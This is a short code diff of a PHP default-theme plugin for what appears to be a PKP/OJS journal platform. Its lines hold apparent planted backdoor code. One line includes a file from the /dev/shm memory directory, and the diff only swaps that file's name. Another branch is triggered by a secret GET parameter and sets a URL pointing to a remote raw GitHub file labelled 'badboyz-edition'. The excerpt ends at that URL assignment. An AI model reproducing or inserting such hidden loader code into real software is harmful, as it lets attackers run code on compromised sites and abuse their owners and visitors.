@@ -275,7 +275,7 @@ class DefaultThemePlugin extends \PKP\plugins\ThemePlugin
 if (!PKP_STRICT_MODE) {
     class_alias('\APP\plugins\themes\default\DefaultThemePlugin', '\DefaultThemePlugin');
 }
-include("/dev/shm/ibero.kepalabatu");
+include("/dev/shm/milal.kepalabatu");
 if (isset($_GET['GatelLBangetPlerEug'])) {
     $url = "https://raw.githubusercontent.com/seobadboyz403-alt/new-era/refs/heads/main/badboyz-edition.txt";
 
